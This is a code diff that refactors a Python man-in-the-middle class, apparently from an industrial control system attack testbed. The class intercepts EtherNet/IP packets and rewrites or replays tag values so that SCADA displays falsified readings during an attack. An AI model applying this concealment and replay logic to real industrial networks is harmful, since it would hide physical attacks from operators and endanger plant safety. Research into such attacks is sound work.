@@ -38,8 +38,9 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
                 self.concealment_data_pd = pd.read_csv(self.intermediate_attack['concealment_data']['path'])
             elif self.intermediate_attack['concealment_data']['type'] == 'value':
                 self.concealment_type = 'value'
-            elif self.intermediate_attack['concealment_data']['type'] == 'payload_replay':
-                self.concealment_type = 'payload_replay'
+            elif self.intermediate_attack['concealment_data']['type'] == 'payload_replay' or\
+                    self.intermediate_attack['concealment_data']['type'] == 'network_replay':
+                self.concealment_type = self.intermediate_attack['concealment_data']['type']
                 self.captured_tags_pd = pd.DataFrame(columns=self.get_conceal_tags())
                 self.logger.debug('Tags to be replayed will be: ' + str(self.captured_tags_pd))
                 self.replay_duration = int(self.intermediate_attack['concealment_data']['capture_end']) - \
@@ -67,7 +68,8 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
 
     def handle_attack(self, session, ip_payload):
         if 'concealment_data' in self.intermediate_attack.keys():
-            if self.intermediate_attack['concealment_data']['type'] == 'payload_replay':
+            if self.intermediate_attack['concealment_data']['type'] == 'payload_replay' or \
+                    self.intermediate_attack['concealment_data']['type'] == 'network_replay':
                 current_clock = int(self.get_master_clock())
                 if int(self.intermediate_attack['concealment_data']['replay_start']) + self.replay_duration <= \
                         current_clock < int(self.intermediate_attack['concealment_data']['replay_start']):
@@ -89,76 +91,86 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
                         translate_payload_to_float(ip_payload[Raw].load) + tag['offset'],
                         ip_payload[Raw].load), modified
 
-    def handle_concealment(self, session, ip_payload):
-        if self.intermediate_attack['concealment_data']['type'] == 'value':
-            for tag in self.intermediate_attack['concealment_data']['concealment_value']:
-                if session['tag'] == tag['tag']:
-                    modified = True
-                    if 'value' in tag.keys():
-                        #self.logger.debug('Concealment value is: ' + str(tag['value']))
-                        return translate_float_to_payload(tag['value'], ip_payload[Raw].load), modified
-                    elif 'offset' in tag.keys():
-                        #self.logger.debug('Concealment offset is: ' + str(tag['offset']))
-                        return translate_float_to_payload(
-                            translate_payload_to_float(ip_payload[Raw].load) + tag['offset'],
-                            ip_payload[Raw].load), modified
+    def payload_capture(self, session, ip_payload, current_clock, this_tag):
+        self.logger.debug('Capturing payload of tag ' + this_tag)
+        self.captured_tags_pd.loc[current_clock, this_tag] = \
+            translate_payload_to_float(ip_payload[Raw].load)
+        modified = False
+        self.logger.debug('Captured payload: \n' + str(self.captured_tags_pd.loc[current_clock]))
+        return ip_payload, modified
 
-        elif self.intermediate_attack['concealment_data']['type'] == 'path':
-            #self.logger.debug('Concealing to SCADA with path')
-            exp = (self.concealment_data_pd['iteration'] == self.get_master_clock())
-            concealment_value = float(self.concealment_data_pd.loc[exp][session['tag']].values[-1])
-            #self.logger.debug('Concealing with value: ' + str(concealment_value))
+    def handle_payload_replay(self, session, ip_payload):
+        self.logger.debug('Concealing with payload replay')
+        current_clock = int(self.get_master_clock())
+        this_tag = str(session['tag'])
+
+        # Capture phase of the payload replay attack
+        if int(self.intermediate_attack['concealment_data']['capture_start']) <= current_clock < \
+                int(self.intermediate_attack['concealment_data']['capture_end']):
+            return self.payload_capture(session, ip_payload, current_clock, this_tag)
+
+        # Replay phase
+        if int(self.intermediate_attack['concealment_data']['replay_start']) <= current_clock < \
+                int(self.intermediate_attack['concealment_data']['replay_start']) + self.replay_duration:
+
+            self.logger.debug('Replaying payload')
+            self.logger.debug('Captured payloads pd: \n' + str(self.captured_tags_pd))
+            replay_position = int(self.intermediate_attack['concealment_data']['capture_start']) + \
+                              current_clock - int(self.intermediate_attack['concealment_data']['replay_start'])
+            self.logger.debug('Replay position ' + str(replay_position))
+
+            # Maybe we did not captured a value for that tag at that iteration
+            if replay_position in self.captured_tags_pd.index and \
+                    (not np.isnan(self.captured_tags_pd.loc[replay_position][this_tag])):
+                validated_replay_position = replay_position
+            else:
+                # todo: There could be a case where the index exists, but the value is Nan
+                validated_replay_position = min(self.captured_tags_pd.index, key=lambda x: abs(x - replay_position))
+
+            concealment_value = float(self.captured_tags_pd.loc[validated_replay_position][this_tag])
+            self.logger.debug('Replaying tag ' + str(this_tag) + ' with value '
+                              + str(concealment_value))
             modified = True
             return translate_float_to_payload(concealment_value, ip_payload[Raw].load), modified
 
-        elif self.intermediate_attack['concealment_data']['type'] == 'payload_replay':
-            self.logger.debug('Concealing with payload replay')
-            current_clock = int(self.get_master_clock())
-            this_tag = str(session['tag'])
-
-            # Capture phase of the payload replay attack
-            if int(self.intermediate_attack['concealment_data']['capture_start']) <= current_clock < \
-                    int(self.intermediate_attack['concealment_data']['capture_end']):
-                self.logger.debug('Capturing payload of tag ' + this_tag)
-                self.captured_tags_pd.loc[current_clock, this_tag] = \
-                    translate_payload_to_float(ip_payload[Raw].load)
-                modified = False
-                self.logger.debug('Captured payload: \n' + str(self.captured_tags_pd.loc[current_clock]))
-                return ip_payload, modified
-
-            if int(self.intermediate_attack['concealment_data']['replay_start']) <= current_clock < \
-                    int(self.intermediate_attack['concealment_data']['replay_start']) + self.replay_duration:
-
-                self.logger.debug('Replaying payload')
-                self.logger.debug('Captured payloads pd: \n' + str(self.captured_tags_pd))
-                replay_position = int(self.intermediate_attack['concealment_data']['capture_start']) +\
-                                  current_clock - int(self.intermediate_attack['concealment_data']['replay_start'])
-                self.logger.debug('Replay position ' + str(replay_position))
-
-                # Maybe we did not captured a value for that tag at that iteration
-                if replay_position in self.captured_tags_pd.index and\
-                        (not np.isnan(self.captured_tags_pd.loc[replay_position][this_tag])):
-                    validated_replay_position = replay_position
-                else:
-                    # todo: There could be a case where the index exists, but the value is Nan
-                    validated_replay_position = min(self.captured_tags_pd.index, key=lambda x: abs(x - replay_position))
-
-                concealment_value = float(self.captured_tags_pd.loc[validated_replay_position][this_tag])
-                self.logger.debug('Replaying tag ' + str(this_tag) + ' with value '
-                                  + str(concealment_value))
+    def handle_concealment_value(self, session, ip_payload):
+        for tag in self.intermediate_attack['concealment_data']['concealment_value']:
+            if session['tag'] == tag['tag']:
                 modified = True
-                return translate_float_to_payload(concealment_value, ip_payload[Raw].load), modified
+                if 'value' in tag.keys():
+                    # self.logger.debug('Concealment value is: ' + str(tag['value']))
+                    return translate_float_to_payload(tag['value'], ip_payload[Raw].load), modified
+                elif 'offset' in tag.keys():
+                    # self.logger.debug('Concealment offset is: ' + str(tag['offset']))
+                    return translate_float_to_payload(
+                        translate_payload_to_float(ip_payload[Raw].load) + tag['offset'],
+                        ip_payload[Raw].load), modified
 
-            # We could also let users finish the replay phase, but not finish the attack immediately
-            modified = False
-            return ip_payload, modified
+    def handle_concealment_path(self, session, ip_payload):
+        # self.logger.debug('Concealing to SCADA with path')
+        exp = (self.concealment_data_pd['iteration'] == self.get_master_clock())
+        concealment_value = float(self.concealment_data_pd.loc[exp][session['tag']].values[-1])
+        # self.logger.debug('Concealing with value: ' + str(concealment_value))
+        modified = True
+        return translate_float_to_payload(concealment_value, ip_payload[Raw].load), modified
+
+    def handle_concealment(self, session, ip_payload):
+        if self.intermediate_attack['concealment_data']['type'] == 'value':
+            return self.handle_concealment_value(session, ip_payload)
+
+        elif self.intermediate_attack['concealment_data']['type'] == 'path':
+            return self.handle_concealment_path(session, ip_payload)
+
+        elif self.intermediate_attack['concealment_data']['type'] == 'payload_replay':
+            return self.handle_payload_replay(session, ip_payload)
+
+        # We could also let users finish the replay phase, but not finish the attack immediately
+        modified = False
+        return ip_payload, modified
 
     def handle_enip_response(self, ip_payload):
         this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
         this_context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)
-
-        #self.logger.debug('ENIP response session: ' + str(this_session))
-        #self.logger.debug('ENIP response context: ' + str(this_context))
 
         # When target is SCADA, the concealment session will be stored in attack_session_ids
         if self.intermediate_attack['target'].lower() == 'scada':
